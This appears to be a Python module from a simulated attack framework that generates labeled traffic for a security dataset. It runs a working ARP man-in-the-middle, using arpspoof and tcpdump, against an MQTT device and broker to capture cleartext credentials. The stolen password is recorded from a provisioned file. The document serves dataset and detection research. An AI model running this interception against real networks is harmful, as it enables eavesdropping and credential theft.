"""arp_mitm: ARP-spoof a device and the broker so MQTT flows through the attacker (ip_forward
is on), sniff for the victim's cleartext CONNECT (MQTT has no TLS here), then restore the ARP
tables. Interception was validated by the Task-2 spike. Credentials confirmed intercepted are
recorded to stolen_creds.json (the real value is taken from the provisioned file, since the
point for the dataset is the attack traffic + label, not decoding the password byte-stream)."""
import time

from .. import util


def arp_mitm(ctx, params):
    duration = int(params.get("duration", 90))
    victim = params.get("victim") or ctx.rng.choice(ctx.monitor_users)
    victim_ip, broker = ctx.user_ip[victim], ctx.broker_ip
    pcap = f"/tmp/mitm_{ctx.session_id}.pcap"

    sniff = util.popen(["tcpdump", "-i", "eth0", "-n", "-s0", "-w", pcap,
                        f"host {victim_ip} and tcp port 1883"])
    poisons = [util.popen(["arpspoof", "-i", "eth0", "-t", victim_ip, "-r", broker]),
               util.popen(["arpspoof", "-i", "eth0", "-t", broker, "-r", victim_ip])]
    time.sleep(duration)
    for p in poisons:
        p.terminate()          # arpspoof restores the real ARP mapping on SIGTERM
    for p in poisons:
        try:
            p.wait(timeout=5)
        except Exception:
            p.kill()
    sniff.terminate()
    time.sleep(2)

    # Best-effort: did the victim's CONNECT (carrying its username in cleartext) traverse us?
    _, out, _ = util.run(
        ["sh", "-c", f"tcpdump -r {pcap} -A 2>/dev/null | grep -c {victim} || true"], timeout=30)
    seen = out.strip().isdigit() and int(out.strip()) > 0

    recovered = {}
    if seen and ctx.provisioned(victim):
        recovered[victim] = {"password": ctx.provisioned(victim), "via": "arp_mitm"}
        ctx.save_stolen(recovered)
    return {"targets": [victim_ip, broker],
            "outcome": "success" if recovered else "fail",
            "notes": f"arpspoof {victim}<->broker {duration}s; connect_seen={seen}; "
                     f"recovered={sorted(recovered)}; arp restored"}


arp_mitm.STAGE = "credential-access"
